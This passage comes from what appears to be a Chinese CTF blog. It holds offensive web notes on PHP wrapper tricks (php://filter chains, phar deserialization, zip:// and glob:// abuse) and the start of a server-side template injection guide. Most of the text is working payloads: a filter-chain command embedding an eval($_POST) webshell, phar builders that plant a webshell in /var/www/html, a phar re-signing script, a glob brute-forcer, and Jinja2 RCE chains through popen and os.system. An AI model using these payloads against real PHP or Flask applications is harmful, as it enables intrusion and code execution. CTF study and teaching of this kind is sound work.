来生成字母对应的字符编码（与要用的本地文件内容无关）</p><blockquote><p>使用方法(linux系统)</p><p>在test.py中修改要写入的命令的base64编码（注意：base64编码后不能含有+ / =等，有的话可以通过加空格或者后面补一些垃圾字符来消除）</p><p><a href="http://xn--test-k55ll68a.py">运行test.py</a>,将结果中resource=后面的内容换成本地文件，如果不能文件内容是中文，需要先用php://filter/convert.base64-encode/resource= 进行转换，相当于两次php://filter</p></blockquote><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a> 这个工具就直接一把梭（base64所有字符都支持）</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">python3 php_filter_chain_generator.py --chain &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br></code></pre></td></tr></table></figure><p><a href="https://tttang.com/archive/1395/#toc_php-base64-filter">https://tttang.com/archive/1395/#toc_php-base64-filter</a></p><p><a href="https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkjQKD5%3DfFOWeD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-16">https://xz.aliyun.com/t/12939?time__1311=mqmhqIx%2BxfOD7DloaGkjQKD5%3DfFOWeD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-16</a></p><p>受php filter链影响的函数（都要通过post传参才可）</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Pattern</strong></th></tr></thead><tbody><tr><td>*<strong>file_get_contents*</strong></td><td><code>file_get_contents($_POST[0]);</code></td></tr><tr><td>*<strong>readfile*</strong></td><td><code>readfile($_POST[0]);</code></td></tr><tr><td>*<strong>finfo-&gt;file*</strong></td><td><code>$file = new finfo(); $fileinfo = $file-&gt;file($_POST[0], FILEINFO_MIME);</code></td></tr><tr><td>*<strong>getimagesize*</strong></td><td><code>getimagesize($_POST[0]);</code></td></tr><tr><td>*<strong>md5_file*</strong></td><td><code>md5_file($_POST[0]);</code></td></tr><tr><td>*<strong>sha1_file*</strong></td><td><code>sha1_file($_POST[0]);</code></td></tr><tr><td>*<strong>hash_file*</strong></td><td><code>hash_file('md5', $_POST[0]);</code></td></tr><tr><td>*<strong>file*</strong></td><td><code>file($_POST[0]);</code></td></tr><tr><td>*<strong>parse_ini_file*</strong></td><td><code>parse_ini_file($_POST[0]);</code></td></tr><tr><td>*<strong>copy*</strong></td><td><code>copy($_POST[0], '/tmp/test');</code></td></tr><tr><td>*<strong>file_put_contents (only target read only with this)*</strong></td><td><code>file_put_contents($_POST[0], &quot;&quot;);</code></td></tr><tr><td>*<strong>stream_get_contents*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); stream_get_contents($file);</code></td></tr><tr><td>*<strong>fgets*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgets($file);</code></td></tr><tr><td>*<strong>fread*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fread($file, 10000);</code></td></tr><tr><td>*<strong>fgetc*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetc($file);</code></td></tr><tr><td>*<strong>fgetcsv*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fgetcsv($file, 1000, &quot;,&quot;);</code></td></tr><tr><td>*<strong>fpassthru*</strong></td><td><code>$file = fopen($_POST[0], &quot;r&quot;); fpassthru($file);</code></td></tr><tr><td>*<strong>fputs*</strong></td><td><code>$file = fopen($_POST[0], &quot;rw&quot;); fputs($file, 0);</code></td></tr></tbody></table><h3 id="phar"><a class="markdownIt-Anchor" href="#phar"></a> phar://</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span>压缩文件绝对路径/压缩文件内的子文件名<br></code></pre></td></tr></table></figure><p>例如</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/tmp/</span>a.zip/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p><code>/tmp/a.zip</code>表示要解析的压缩包，与扩展名无关，可以是<code>/tmp/a.jpg</code>等</p><p>文件操作函数都会触发phar反序列化</p><h4 id="phar结合文件上传进行反序列利用"><a class="markdownIt-Anchor" href="#phar结合文件上传进行反序列利用"></a> phar结合文件上传进行反序列利用</h4><p>（要将php.ini中的phar.readonly选项设置为Off才能生成phar文件）</p><p>基础操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span> = <span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span> = <span class="hljs-string">&#x27;true&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>会将内容写到1.phar中</p><p>加GIF89a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);  <br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); <span class="hljs-comment">//phar协议是通过这个来判断是不是phar文件</span><br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$object</span> -&gt; code= <span class="hljs-string">&quot;system(&#x27;cat /ffflllaaaggg&#x27;);&quot;</span>;<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;1.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;gzip 1.phar&quot;</span>); <span class="hljs-comment">//压缩文件</span><br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;1.phar.gz&quot;</span>, <span class="hljs-string">&quot;1.jpg&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">phar:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><h4 id="phar重签名"><a class="markdownIt-Anchor" href="#phar重签名"></a> phar重签名</h4><p>如果修改了.phar里面的内容则需要对phar进行重签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># phar重签名</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf)  <span class="hljs-comment"># 写入新文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f) <span class="hljs-comment">#需要以url编码后才能传输</span><br><span class="hljs-built_in">print</span>(ff)<br></code></pre></td></tr></table></figure><h4 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h4><ol><li>不能是phar开头</li></ol><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">if (preg_match(&quot;/</span><span class="hljs-keyword">^php</span><span class="language-xml">|</span><span class="hljs-keyword">^file</span><span class="language-xml">|</span><span class="hljs-keyword">^phar</span><span class="language-xml">|</span><span class="hljs-keyword">^dict</span><span class="language-xml">|</span><span class="hljs-keyword">^zip</span><span class="language-xml">/i&quot;,</span><span class="hljs-variable">$filename</span><span class="language-xml">)&#123;</span><br><span class="language-xml">    die();</span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phar:<span class="hljs-regexp">//</span>test.phar<br>compress.bzip2:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/test.phar/</span>test.txt<br>compress.zlib:<span class="hljs-regexp">//</span>phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/home/</span>sx<span class="hljs-regexp">/test.phar/</span>test.txt<br></code></pre></td></tr></table></figure><ol start="2"><li>过滤__HALT_COMPILER</li></ol><p>进行压缩就可以绕过__HALT_COMPILER</p><h3 id="zip"><a class="markdownIt-Anchor" href="#zip"></a> zip://</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span>压缩文件绝对路径<span class="hljs-comment">#压缩文件内的子文件名</span><br></code></pre></td></tr></table></figure><p>压缩文件要用绝对路径，#要url编码<code>%23</code>，同样与压缩包的扩展名无关</p><p>本地文件包含需要能进行文件上传，压缩包需要先上传到主机</p><h3 id="glob"><a class="markdownIt-Anchor" href="#glob"></a> glob://</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$file</span>); <span class="hljs-comment">//DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>DirectoryIterator与glob://结合将无视<code>open_basedir</code>(这个是限制php脚本能够访问的文件路径)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&quot;http://172.10.0.5&quot;</span><br><br>r = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-comment"># print(i)</span><br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;*+[]?&quot;</span>:<br>            <span class="hljs-keyword">continue</span><br>        payload = <span class="hljs-string">&quot;glob://&quot;</span> + r + i + <span class="hljs-string">&quot;*&quot;</span><br>        data = &#123;<span class="hljs-string">&quot;filename&quot;</span>:payload&#125;<br>        res = requests.post(url=url, data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;yesyesyes&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            r += i<br>            <span class="hljs-built_in">print</span>(r)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/06/11/SSTI/"/>
    <url>/2023/06/11/SSTI/</url>
    
    <content type="html"><![CDATA[<h3 id="ssti简介"><a class="markdownIt-Anchor" href="#ssti简介"></a> SSTI简介</h3><p>SSTI(server-side template injection) 服务端模板注入。当攻击者能够使用本地模板语法将恶意负载注入模板，然后在服务器端执行时，就会发生服务器端模板注入。</p><p>直接将用户的输入写入到模板中就会导致模板注入。</p><p>SSTI第一步是要找到注入的位置，然后识别模板引擎，只有模板引擎判断正确了，才能找相应的payload，以下是判断模板引擎类型的方法，</p><ul><li>通过测试使系统报错，从而看到使用的引擎</li></ul><p>可能使系统报错的payload</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$&#123;&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&lt;%= %&gt;</span><br><span class="language-xml">$&#123;7/0&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7/0</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&lt;%= 7/0 %&gt;</span><br><span class="language-xml">$&#123;foobar&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">foobar</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&lt;%= foobar %&gt;</span><br><span class="language-xml">$&#123;7*7&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">``</span><br></code></pre></td></tr></table></figure><ul><li>通过数学表达式测试模板</li></ul><p>​     <img src="/2023/06/11/SSTI/1.jpg" class=""></p><h3 id="python类"><a class="markdownIt-Anchor" href="#python类"></a> python类</h3><p>用<code>wappalyzer</code>判断框架</p><h4 id="jinja2模板注入"><a class="markdownIt-Anchor" href="#jinja2模板注入"></a> Jinja2模板注入</h4><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters%EF%BC%88%E8%AF%AD%E6%B3%95%EF%BC%89">https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters（语法）</a></p><p>一下例子用于快速起环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, request<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)<br>    <span class="hljs-built_in">print</span> exploit<br><br>    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)<br>    <span class="hljs-built_in">print</span>(rendered_template)<br><br>    <span class="hljs-keyword">return</span> render_template_string(rendered_template)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>Jinja2是Python的flask框架的一部分</p><p>jinja2的模板形式</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;% %&#125; # 控制结构<br>&#123;&#123; &#125;&#125; # 变量表示符<br>&#123;# #&#125; # 注释<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;ul&gt;<br>&#123;&#123;<span class="hljs-comment">#举个例子#&#125;&#125;</span><br>     &#123;% <span class="hljs-keyword">for</span> comment <span class="hljs-keyword">in</span> comments %&#125;<br>         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt;<br>     &#123;% endfor %&#125;<br>&lt;/ul&gt;<br></code></pre></td></tr></table></figure><p>漏洞产生：模板的html代码写在Python文件中，并且模板中有写入用户可以控制的变量</p><p>测试注入点</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">2</span>&#125;&#125;</span><span class="language-xml"> #返回4</span><br></code></pre></td></tr></table></figure><h5 id="常规payload"><a class="markdownIt-Anchor" href="#常规payload"></a> 常规payload</h5><p>思路基本上都是为了找到<code>builtins</code>然后链上RCE，一般是先找到object然后列出所有子类，然后走init到global再到builtins</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#命令执行</span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">subprocess.Popen</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[258](<span class="hljs-name">&#x27;ls&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">_frozen_importlib.BuiltinImporter</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[80][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>).system(<span class="hljs-name">&quot;ls&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">click.utils.LazyFile</span>&#x27;&gt;</span></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">475</span>).__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[177].__init__.__globals__.__builtins__[&quot;open&quot;](<span class="hljs-name">&quot;/tmp/&quot;</span><span class="hljs-string">&quot;f&quot;</span><span class="hljs-string">&quot;l&quot;</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-string">&quot;g&quot;</span>).read().encode().hex()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"># <span class="hljs-tag">&lt;<span class="hljs-name">class</span> &#x27;<span class="hljs-attr">warnings.catch_warnings</span>&#x27;&gt;</span></span><br><span class="language-xml">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[189].__init__.__globals__[&#x27;__builtins__&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#123;%print(().__class__.__base__.__subclasses__()[138][&quot;__in&quot;+&quot;it__&quot;].__globals__[&quot;__builtins__&quot;][&quot;__imp&quot;+&quot;ort__&quot;](&quot;os&quot;).__dict__[&quot;pop&quot;+&quot;en&quot;](&quot;cat flag&quot;).read())%&#125;</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self.__init__.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span 